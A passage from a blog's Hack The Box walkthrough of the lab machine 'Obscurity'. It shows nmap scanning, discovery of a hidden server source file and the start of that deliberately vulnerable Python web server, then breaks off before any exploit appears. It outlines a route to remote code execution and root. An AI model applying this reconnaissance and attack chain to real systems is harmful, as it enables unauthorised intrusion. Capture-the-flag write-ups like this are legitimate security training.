@@ -1,0 +1,909 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>Ahmed | Hack The Box - Obscurity</title>
+  <meta name="description" content="This is my writeup and walkthrough for Obscurity from Hack The Box.">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  <meta property="og:title" content="Hack The Box - Obscurity">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://y4mm1.github.io/posts/obscurity">
+  <meta property="og:description" content="This is my writeup and walkthrough for Obscurity from Hack The Box.">
+  <meta property="og:site_name" content="Ahmed">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:url" content="https://y4mm1.github.io/posts/obscurity">
+  <meta name="twitter:title" content="Hack The Box - Obscurity">
+  <meta name="twitter:description" content="This is my writeup and walkthrough for Obscurity from Hack The Box.">
+
+  
+    
+      <meta property="og:image" content="https://y4mm1.github.io/assets/documentation/hack-the-box/obscurity/obscurity-afc635e9d8852e1e52e6b7af9f021d78451d8d0f35cf79c65216b279b01af0c4.png">
+      <meta name="twitter:image" content="https://y4mm1.github.io/assets/documentation/hack-the-box/obscurity/obscurity-afc635e9d8852e1e52e6b7af9f021d78451d8d0f35cf79c65216b279b01af0c4.png">
+    
+  
+
+  <link href="https://y4mm1.github.io/feed.xml" type="application/rss+xml" rel="alternate" title="Ahmed Last 10 blog posts" />
+
+  
+
+  
+
+    
+      <link rel="icon" type="image/x-icon" href="/assets/favicon-color-0e896bd8673d9f83cea8d7b0a12fcc894681d58fc475ad499adfed94067b1e1f.png">
+      <link rel="apple-touch-icon" href="/assets/apple-touch-icon-light-87d1f2a3a19b1500e5c1626a0492025ca5f7f97d24540dc5900288e92112925a.png">
+      <link rel="stylesheet" type="text/css" href="/assets/light-d09aacb6545f381fc97f304886774210c2a8683515671143f960bc0912af94fe.css">
+    
+
+  
+
+</head>
+
+<body>
+  <main>
+    <div class="grid grid-centered">
+      <div class="grid-cell">
+        <nav class="header-nav scrollappear">
+  <a href="/" class="header-logo" title="Ahmed">Ahmed</a>
+  <ul class="header-links">
+    
+      <li>
+        <a href="/about" title="About me">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-about">
+  <use href="/assets/about-ab4928d09cef6e09136b8d40637999db4f9575f927c33156e7f3e37d450e5df1.svg#icon-about" xlink:href="/assets/about-ab4928d09cef6e09136b8d40637999db4f9575f927c33156e7f3e37d450e5df1.svg#icon-about"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="https://www.facebook.com/manneredperson" rel="noreferrer noopener" target="_blank" title="Facebook">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-facebook">
+  <use href="/assets/facebook-5a38f0a900ec68e86eaccd4683fcad4e4de77281f876d9476a560a0a69cac8bf.svg#icon-facebook" xlink:href="/assets/facebook-5a38f0a900ec68e86eaccd4683fcad4e4de77281f876d9476a560a0a69cac8bf.svg#icon-facebook"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+      <li>
+        <a href="https://github.com/y4mm1" rel="noreferrer noopener" target="_blank" title="GitHub">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-github">
+  <use href="/assets/github-706d546fe6b5a32deca92fb08bbe60e78ea4e8027e889107905eb61f1063bcec.svg#icon-github" xlink:href="/assets/github-706d546fe6b5a32deca92fb08bbe60e78ea4e8027e889107905eb61f1063bcec.svg#icon-github"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="https://www.linkedin.com/in/sayeddd" rel="noreferrer noopener" target="_blank" title="LinkedIn">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-linkedin">
+  <use href="/assets/linkedin-3bd8eb5ea036958dc7b3ee3de6612dbfa9e0744f369f20f7895d6a2782bbaf43.svg#icon-linkedin" xlink:href="/assets/linkedin-3bd8eb5ea036958dc7b3ee3de6612dbfa9e0744f369f20f7895d6a2782bbaf43.svg#icon-linkedin"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+      <li>
+        <a href="mailto:ahmedsayedgfx@gmail.com" title="Email">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-email">
+  <use href="/assets/email-30a104adb1e2728097a984fbea2995978b6fff6c12906a734044ebd388848b70.svg#icon-email" xlink:href="/assets/email-30a104adb1e2728097a984fbea2995978b6fff6c12906a734044ebd388848b70.svg#icon-email"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+      <li>
+        <a href="/feed.xml" rel="noreferrer noopener" target="_blank" title="RSS">
+          <svg xmlns="http://www.w3.org/2000/svg" class="icon-rss">
+  <use href="/assets/rss-cdc7a721b47671668abb0ba57f9f8db8022096e0051ff51b9e08e6cc049453a4.svg#icon-rss" xlink:href="/assets/rss-cdc7a721b47671668abb0ba57f9f8db8022096e0051ff51b9e08e6cc049453a4.svg#icon-rss"></use>
+</svg>
+
+        </a>
+      </li>
+    
+    
+  </ul>
+</nav>
+
+
+  <ul class="header-tags scrollappear">
+    
+    
+      
+        <li><a href="/tag/AUCTF">Auctf</a></li>
+    
+      
+        <li><a href="/tag/CTF">Ctf</a></li>
+    
+      
+        <li><a href="/tag/WPICTF">Wpictf</a></li>
+    
+      
+        <li><a href="/tag/algorithms">Algorithms</a></li>
+    
+      
+        <li><a href="/tag/analysis">Analysis</a></li>
+    
+      
+        <li><a href="/tag/angstromCTF">Angstromctf</a></li>
+    
+      
+        <li><a href="/tag/c">C</a></li>
+    
+      
+        <li><a href="/tag/cracking">Cracking</a></li>
+    
+      
+        <li><a href="/tag/crypto">Crypto</a></li>
+    
+      
+        <li><a href="/tag/cryptography">Cryptography</a></li>
+    
+      
+        <li>...</li>
+        <li><a href="/tags">Show all</a></li>
+        
+  </ul>
+
+
+        <article class="article scrollappear">
+          <header class="article-header">
+            <h1>Hack The Box - Obscurity</h1>
+            <p>This is my writeup and walkthrough for Obscurity from Hack The Box.</p>
+            <div class="article-list-footer">
+  <span class="article-list-date">
+    May 9, 2020
+  </span>
+  <span class="article-list-divider">-</span>
+  <span class="article-list-minutes">
+    
+    
+      22 minute read
+    
+  </span>
+  <span class="article-list-divider">-</span>
+  <div class="article-list-tags">
+    
+      
+      <a href="/tag/security" title="See all posts with tag 'Security'">Security</a>
+    
+      
+      <a href="/tag/hack-the-box" title="See all posts with tag 'Hack-The-Box'">Hack-The-Box</a>
+    
+      
+      <a href="/tag/machines" title="See all posts with tag 'Machines'">Machines</a>
+    
+      
+      <a href="/tag/ssh" title="See all posts with tag 'SSH'">SSH</a>
+    
+      
+      <a href="/tag/user" title="See all posts with tag ''"></a>
+    
+      
+      <a href="/tag/root" title="See all posts with tag 'Root'">Root</a>
+    
+      
+      <a href="/tag/obsecurity" title="See all posts with tag ''"></a>
+    
+      
+      <a href="/tag/pentesting" title="See all posts with tag 'Pentesting'">Pentesting</a>
+    
+      
+      <a href="/tag/python" title="See all posts with tag 'Python'">Python</a>
+    
+      
+      <a href="/tag/hacking" title="See all posts with tag 'Hacking'">Hacking</a>
+    
+      
+      <a href="/tag/scripting" title="See all posts with tag ''"></a>
+    
+      
+      <a href="/tag/nmap" title="See all posts with tag 'Nmap'">Nmap</a>
+    
+  </div>
+</div>
+          </header>
+
+          <div class="article-content">
+            <p><a href="/assets/documentation/hack-the-box/obscurity/obscurity-afc635e9d8852e1e52e6b7af9f021d78451d8d0f35cf79c65216b279b01af0c4.png">
+  <img src="/assets/documentation/hack-the-box/obscurity/obscurity-afc635e9d8852e1e52e6b7af9f021d78451d8d0f35cf79c65216b279b01af0c4.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/obscurity-afc635e9d8852e1e52e6b7af9f021d78451d8d0f35cf79c65216b279b01af0c4.png" data-zooming-width="595" data-zooming-height="378" />
+</a></p>
+
+<p>A medium linux machine with some vulnerable <strong>Python</strong> scripts from <strong>HTB</strong> just retired with the following:</p>
+<ul>
+  <li>Missconfigured vulnerable <strong>Python</strong> web server to <strong>RCE</strong>.</li>
+  <li>Weak encryption algorithm to sign two messages, some text and the user password file.</li>
+  <li>Vulnerable script to get the root password hash from the <strong>shadow</strong> file.</li>
+</ul>
+
+<h2 id="enumeration">Enumeration</h2>
+
+<h3 id="1-nmap">1. Nmap</h3>
+
+<p>As always let’s add <code class="highlighter-rouge">10.10.10.168</code> to our <code class="highlighter-rouge">/etc/hosts</code> file as <code class="highlighter-rouge">obscure.htb</code> and start scan the host with <code class="highlighter-rouge">nmap</code> to see the open ports and services running on the machine:</p>
+
+<figure class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">y4mm1@kali:~$</span><span class="w"> </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oN</span> initial.nmap obscure.htb
+<span class="gp">#</span><span class="w"> </span>Nmap 7.80 scan initiated Tue Feb 11 02:43:04 2020 as: nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-sT</span> <span class="nt">-oN</span> initial.nmap obscure.htb
+<span class="go">Nmap scan report for obscure.htb (10.10.10.168)
+Host is up (0.084s latency).
+Not shown: 996 filtered ports
+PORT     STATE  SERVICE    VERSION
+</span><span class="gp">22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
+<span class="go">| ssh-hostkey: 
+|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
+|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
+|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+80/tcp   closed http
+8080/tcp open   http-proxy BadHTTPServer
+| fingerprint-strings: 
+|   GetRequest, HTTPOptions: 
+|     HTTP/1.1 200 OK
+|     Date: Tue, 11 Feb 2020 00:43:17
+|     Server: BadHTTPServer
+|     Last-Modified: Tue, 11 Feb 2020 00:43:17
+|     Content-Length: 4171
+|     Content-Type: text/html
+|     Connection: Closed
+</span><span class="gp">|     &lt;!DOCTYPE html&gt;</span><span class="w">
+</span><span class="gp">|     &lt;html lang="en"&gt;</span><span class="w">
+</span><span class="gp">|     &lt;head&gt;</span><span class="w">
+</span><span class="gp">|     &lt;meta charset="utf-8"&gt;</span><span class="w">
+</span><span class="gp">|     &lt;title&gt;</span>0bscura&lt;/title&gt;
+<span class="gp">|     &lt;meta http-equiv="X-UA-Compatible" content="IE=Edge"&gt;</span><span class="w">
+</span><span class="gp">|     &lt;meta name="viewport" content="width=device-width, initial-scale=1"&gt;</span><span class="w">
+</span><span class="gp">|     &lt;meta name="keywords" content=""&gt;</span><span class="w">
+</span><span class="gp">|     &lt;meta name="description" content=""&gt;</span><span class="w">
+</span><span class="go">|     &lt;!-- 
+|     Easy Profile Template
+|     http://www.templatemo.com/tm-467-easy-profile
+</span><span class="gp">|     &lt;!-- stylesheet css --&gt;</span><span class="w">
+</span><span class="gp">|     &lt;link rel="stylesheet" href="css/bootstrap.min.css"&gt;</span><span class="w">
+</span><span class="gp">|     &lt;link rel="stylesheet" href="css/font-awesome.min.css"&gt;</span><span class="w">
+</span><span class="gp">|     &lt;link rel="stylesheet" href="css/templatemo-blue.css"&gt;</span><span class="w">
+</span><span class="gp">|     &lt;/head&gt;</span><span class="w">
+</span><span class="gp">|     &lt;body data-spy="scroll" data-target=".navbar-collapse"&gt;</span><span class="w">
+</span><span class="gp">|     &lt;!-- preloader section --&gt;</span><span class="w">
+</span><span class="go">|     &lt;!--
+</span><span class="gp">|     &lt;div class="preloader"&gt;</span><span class="w">
+</span><span class="gp">|_    &lt;div class="sk-spinner sk-spinner-wordpress"&gt;</span><span class="w">
+</span><span class="go">|_http-server-header: BadHTTPServer
+|_http-title: 0bscura
+9000/tcp closed cslistener
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port8080-TCP:V=7.80%I=7%D=2/11%Time=5E41F8A5%P=x86_64-pc-linux-gnu%r(Ge
+SF:tRequest,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Tue,\x2011\x20Feb\x2020
+SF:20\x2000:43:17\nServer:\x20BadHTTPServer\nLast-Modified:\x20Tue,\x2011\
+SF:x20Feb\x202020\x2000:43:17\nContent-Length:\x204171\nContent-Type:\x20t
+</span><span class="gp">SF:ext/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20html&gt;</span><span class="se">\n</span>&lt;html<span class="se">\x</span><span class="nv">20lang</span><span class="o">=</span><span class="se">\"</span>
+<span class="gp">SF:en\"&gt;</span><span class="se">\n</span>&lt;<span class="nb">head</span><span class="o">&gt;</span><span class="se">\n\t</span>&lt;meta<span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span><span class="se">\"</span>utf-8<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\t</span>&lt;title&gt;0bscura&lt;/title&gt;<span class="se">\</span>
+SF:n<span class="se">\t</span>&lt;meta<span class="se">\x</span>20http-equiv<span class="o">=</span><span class="se">\"</span>X-UA-Compatible<span class="se">\"\x</span><span class="nv">20content</span><span class="o">=</span><span class="se">\"</span><span class="nv">IE</span><span class="o">=</span>Edge<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\t</span>&lt;
+<span class="go">SF:meta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-s
+</span><span class="gp">SF:cale=1\"&gt;</span><span class="se">\n\t</span>&lt;meta<span class="se">\x</span><span class="nv">20name</span><span class="o">=</span><span class="se">\"</span>keywords<span class="se">\"\x</span><span class="nv">20content</span><span class="o">=</span><span class="se">\"\"</span><span class="o">&gt;</span><span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20na
+<span class="gp">SF:me=\"description\"\x20content=\"\"&gt;</span><span class="se">\n</span>&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\x</span>20<span class="se">\n</span>Easy<span class="se">\x</span>20Profile<span class="se">\x</span>20Templ
+<span class="gp">SF:ate\nhttp://www\.templatemo\.com/tm-467-easy-profile\n--&gt;</span><span class="se">\n\t</span>&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\x</span>20st
+<span class="gp">SF:ylesheet\x20css\x20--&gt;</span><span class="se">\n\t</span>&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>css/boo
+<span class="gp">SF:tstrap\.min\.css\"&gt;</span><span class="se">\n\t</span>&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>css/font-a
+<span class="gp">SF:wesome\.min\.css\"&gt;</span><span class="se">\n\t</span>&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet<span class="se">\"\x</span><span class="nv">20href</span><span class="o">=</span><span class="se">\"</span>css/templa
+<span class="gp">SF:temo-blue\.css\"&gt;</span><span class="se">\n</span>&lt;/head&gt;<span class="se">\n</span>&lt;body<span class="se">\x</span>20data-spy<span class="o">=</span><span class="se">\"</span>scroll<span class="se">\"\x</span>20data-target
+<span class="gp">SF:=\"\.navbar-collapse\"&gt;</span><span class="se">\n\n</span>&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\x</span>20preloader<span class="se">\x</span>20section<span class="se">\x</span>20--&gt;<span class="se">\n</span>&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\n</span>&lt;
+<span class="gp">SF:div\x20class=\"preloader\"&gt;</span><span class="se">\n\t</span>&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>sk-spinner<span class="se">\x</span>20sk-spinner
+<span class="gp">SF:-wordpress\"&gt;</span><span class="se">\n</span><span class="s2">")%r(HTTPOptions,10FC,"</span>HTTP/1<span class="se">\.</span>1<span class="se">\x</span>20200<span class="se">\x</span>20OK<span class="se">\n</span>Date:<span class="se">\x</span>20
+<span class="go">SF:Tue,\x2011\x20Feb\x202020\x2000:43:17\nServer:\x20BadHTTPServer\nLast-M
+SF:odified:\x20Tue,\x2011\x20Feb\x202020\x2000:43:17\nContent-Length:\x204
+SF:171\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n&lt;!DOCTYPE\x20
+</span><span class="gp">SF:html&gt;</span><span class="se">\n</span>&lt;html<span class="se">\x</span><span class="nv">20lang</span><span class="o">=</span><span class="se">\"</span>en<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n</span>&lt;<span class="nb">head</span><span class="o">&gt;</span><span class="se">\n\t</span>&lt;meta<span class="se">\x</span><span class="nv">20charset</span><span class="o">=</span><span class="se">\"</span>utf-8<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\t</span>
+<span class="gp">SF:&lt;title&gt;</span>0bscura&lt;/title&gt;<span class="se">\n\t</span>&lt;meta<span class="se">\x</span>20http-equiv<span class="o">=</span><span class="se">\"</span>X-UA-Compatible<span class="se">\"\x</span>20co
+<span class="gp">SF:ntent=\"IE=Edge\"&gt;</span><span class="se">\n\t</span>&lt;meta<span class="se">\x</span><span class="nv">20name</span><span class="o">=</span><span class="se">\"</span>viewport<span class="se">\"\x</span><span class="nv">20content</span><span class="o">=</span><span class="se">\"</span><span class="nv">width</span><span class="o">=</span>dev
+<span class="gp">SF:ice-width,\x20initial-scale=1\"&gt;</span><span class="se">\n\t</span>&lt;meta<span class="se">\x</span><span class="nv">20name</span><span class="o">=</span><span class="se">\"</span>keywords<span class="se">\"\x</span>20conte
+<span class="gp">SF:nt=\"\"&gt;</span><span class="se">\n\t</span>&lt;meta<span class="se">\x</span><span class="nv">20name</span><span class="o">=</span><span class="se">\"</span>description<span class="se">\"\x</span><span class="nv">20content</span><span class="o">=</span><span class="se">\"\"</span><span class="o">&gt;</span><span class="se">\n</span>&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\x</span>20<span class="se">\n</span>E
+<span class="go">SF:asy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-pro
+</span><span class="gp">SF:file\n--&gt;</span><span class="se">\n\t</span>&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\x</span>20stylesheet<span class="se">\x</span>20css<span class="se">\x</span>20--&gt;<span class="se">\n\t</span>&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesh
+<span class="gp">SF:eet\"\x20href=\"css/bootstrap\.min\.css\"&gt;</span><span class="se">\n\t</span>&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet
+<span class="gp">SF:\"\x20href=\"css/font-awesome\.min\.css\"&gt;</span><span class="se">\n\t</span>&lt;<span class="nb">link</span><span class="se">\x</span><span class="nv">20rel</span><span class="o">=</span><span class="se">\"</span>stylesheet
+<span class="gp">SF:\"\x20href=\"css/templatemo-blue\.css\"&gt;</span><span class="se">\n</span>&lt;/head&gt;<span class="se">\n</span>&lt;body<span class="se">\x</span>20data-spy<span class="o">=</span><span class="se">\"</span>
+<span class="gp">SF:scroll\"\x20data-target=\"\.navbar-collapse\"&gt;</span><span class="se">\n\n</span>&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\x</span>20preloader<span class="se">\x</span>20
+<span class="gp">SF:section\x20--&gt;</span><span class="se">\n</span>&lt;<span class="o">!</span><span class="nt">--</span><span class="se">\n</span>&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>preloader<span class="se">\"</span><span class="o">&gt;</span><span class="se">\n\t</span>&lt;div<span class="se">\x</span><span class="nv">20class</span><span class="o">=</span><span class="se">\"</span>s
+<span class="gp">SF:k-spinner\x20sk-spinner-wordpress\"&gt;</span><span class="se">\n</span><span class="s2">");
+</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span><span class="s2">CPE: cpe:/o:linux:linux_kernel
+</span><span class="go">
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Tue Feb 11 02:43:27 2020 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>23.09 seconds</code></pre></figure>
+
+<p>As we see there are 4 ports two of them are open <code class="highlighter-rouge">22</code> running <strong>OpenSSH 7.6p1</strong> and it tells us the OS version is <strong>Ubuntu</strong>, and <code class="highlighter-rouge">8080</code> running a http-proxy called <strong>BadHTTPServer</strong> with some successful request headers, so let’s jumb into the browser to see what is it.</p>
+
+<h3 id="2-web-reconnaissance">2. Web Reconnaissance</h3>
+
+<p><a href="/assets/documentation/hack-the-box/obscurity/web_page-3757bc5ad5c1587903adfcf2fe941dee53c8303e62014428ebd460272844e1d4.png">
+  <img src="/assets/documentation/hack-the-box/obscurity/web_page-3757bc5ad5c1587903adfcf2fe941dee53c8303e62014428ebd460272844e1d4.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/web_page-3757bc5ad5c1587903adfcf2fe941dee53c8303e62014428ebd460272844e1d4.png" data-zooming-width="1920" data-zooming-height="1051" />
+</a></p>
+
+<p>It looks like a simple web page with some text and I noticed there is some contact info and an interesting message at the bottom of the page.</p>
+
+<p><a href="/assets/documentation/hack-the-box/obscurity/web_page2-a015bbb181fdc18c9942415adad90ae9c663f3d7036683d613fcce41bd3edb0e.png">
+  <img src="/assets/documentation/hack-the-box/obscurity/web_page2-a015bbb181fdc18c9942415adad90ae9c663f3d7036683d613fcce41bd3edb0e.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/web_page2-a015bbb181fdc18c9942415adad90ae9c663f3d7036683d613fcce41bd3edb0e.png" data-zooming-width="1920" data-zooming-height="1052" />
+</a></p>
+
+<p>The message tells us there is some secret development directory that contains the source code of the running server <code class="highlighter-rouge">SuperSecureServer.py</code>, so first thing came to my mind is to run any directory brutceforcing tools like <code class="highlighter-rouge">gobuster</code>.
+But this did not work, so I can remember from my experience in software development the main source code is usually in some sort of well known folders like <code class="highlighter-rouge">/src</code>, <code class="highlighter-rouge">/app</code>, <code class="highlighter-rouge">/bin</code> …etc and as we saw from the message above a lot of word <code class="highlighter-rouge">development</code>. I tried some of sub-words of that name with the file and it worked with <code class="highlighter-rouge">/develop/SuperSecureServer.py</code>.</p>
+
+<p><a href="/assets/documentation/hack-the-box/obscurity/secret_dir-ecd52cba3246d0f2f44adb85c936146ce29ce51b08aaa47934fb1449434b8926.png">
+  <img src="/assets/documentation/hack-the-box/obscurity/secret_dir-ecd52cba3246d0f2f44adb85c936146ce29ce51b08aaa47934fb1449434b8926.png" alt="Obscurity" class="zooming" data-rjs="/assets/documentation/hack-the-box/obscurity/secret_dir-ecd52cba3246d0f2f44adb85c936146ce29ce51b08aaa47934fb1449434b8926.png" data-zooming-width="1920" data-zooming-height="1050" />
+</a></p>
+
+<p>Let’s download the file and see how the server source code loo like.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">from</span> <span class="nn">datetime</span> <span class="kn">import</span> <span class="n">datetime</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">mimetypes</span>
+<span class="kn">import</span> <span class="nn">urllib.parse</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">respTemplate</span> <span class="o">=</span> <span class="s">"""HTTP/1.1 {statusNum} {statusCode}
+Date: {dateSent}
+Server: {server}
+Last-Modified: {modified}
+Content-Length: {length}
+Content-Type: {contentType}
+Connection: {connectionType}
+
+{body}
+"""</span>
+<span class="n">DOC_ROOT</span> <span class="o">=</span> <span class="s">"DocRoot"</span>
+
+<span class="n">CODES</span> <span class="o">=</span> <span class="p">{</span><span class="s">"200"</span><span class="p">:</span> <span class="s">"OK"</span><span class="p">,</span>
+        <span class="s">"304"</span><span class="p">:</span> <span class="s">"NOT MODIFIED"</span><span class="p">,</span>
+        <span class="s">"400"</span><span class="p">:</span> <span class="s">"BAD REQUEST"</span><span class="p">,</span> <span class="s">"401"</span><span class="p">:</span> <span class="s">"UNAUTHORIZED"</span><span class="p">,</span> <span class="s">"403"</span><span class="p">:</span> <span class="s">"FORBIDDEN"</span><span class="p">,</span> <span class="s">"404"</span><span class="p">:</span> <span class="s">"NOT FOUND"</span><span class="p">,</span>
+        <span class="s">"500"</span><span class="p">:</span> <span class="s">"INTERNAL SERVER ERROR"</span><span class="p">}</span>
+
+<span class="n">MIMES</span> <span class="o">=</span> <span class="p">{</span><span class="s">"txt"</span><span class="p">:</span> <span class="s">"text/plain"</span><span class="p">,</span> <span class="s">"css"</span><span class="p">:</span><span class="s">"text/css"</span><span class="p">,</span> <span class="s">"html"</span><span class="p">:</span><span class="s">"text/html"</span><span class="p">,</span> <span class="s">"png"</span><span class="p">:</span> <span class="s">"image/png"</span><span class="p">,</span> <span class="s">"jpg"</span><span class="p">:</span><span class="s">"image/jpg"</span><span class="p">,</span>
+        <span class="s">"ttf"</span><span class="p">:</span><span class="s">"application/octet-stream"</span><span class="p">,</span><span class="s">"otf"</span><span class="p">:</span><span class="s">"application/octet-stream"</span><span class="p">,</span> <span class="s">"woff"</span><span class="p">:</span><span class="s">"font/woff"</span><span class="p">,</span> <span class="s">"woff2"</span><span class="p">:</span> <span class="s">"font/woff2"</span><span class="p">,</span>
+        <span class="s">"js"</span><span class="p">:</span><span class="s">"application/javascript"</span><span class="p">,</span><span class="s">"gz"</span><span class="p">:</span><span class="s">"application/zip"</span><span class="p">,</span> <span class="s">"py"</span><span class="p">:</span><span class="s">"text/plain"</span><span class="p">,</span> <span class="s">"map"</span><span class="p">:</span> <span class="s">"application/octet-stream"</span><span class="p">}</span>
+
+<span class="k">class</span> <span class="nc">Response</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="o">**</span><span class="n">kwargs</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">__dict__</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">kwargs</span><span class="p">)</span>
+        <span class="n">now</span> <span class="o">=</span> <span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">dateSent</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">modified</span> <span class="o">=</span> <span class="n">now</span><span class="o">.</span><span class="n">strftime</span><span class="p">(</span><span class="s">"</span><span class="si">%</span><span class="s">a, </span><span class="si">%</span><span class="s">d </span><span class="si">%</span><span class="s">b </span><span class="si">%</span><span class="s">Y </span><span class="si">%</span><span class="s">H:</span><span class="si">%</span><span class="s">M:</span><span class="si">%</span><span class="s">S"</span><span class="p">)</span>
+    <span class="k">def</span> <span class="nf">stringResponse</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
+        <span class="k">return</span> <span class="n">respTemplate</span><span class="o">.</span><span class="nb">format</span><span class="p">(</span><span class="o">**</span><span class="bp">self</span><span class="o">.</span><span class="n">__dict__</span><span class="p">)</span>
+
+<span class="k">class</span> <span class="nc">Request</span><span class="p">:</span>
+    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="bp">self</span><span class="o">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">True</span>
+        <span class="k">try</span><span class="p">:</span>
+            <span class="n">request</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">parseRequest</span><span class="p">(</span><span class="n">request</span><span class="p">)</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">method</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"method"</span><span class="p">]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">doc</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"doc"</span><span class="p">]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">vers</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"vers"</span><span class="p">]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">header</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"header"</span><span class="p">]</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">body</span> <span class="o">=</span> <span class="n">request</span><span class="p">[</span><span class="s">"body"</span><span class="p">]</span>
+        <span class="k">except</span><span class="p">:</span>
+            <span class="bp">self</span><span class="o">.</span><span class="n">good</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="k">def</span> <span class="nf">parseRequest</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">request</span><span class="p">):</span>
+        <span class="n">req</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">strip</span><span class="p">(</span><span class="s">"</span><span class="se">\r</span><span class="s">"</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
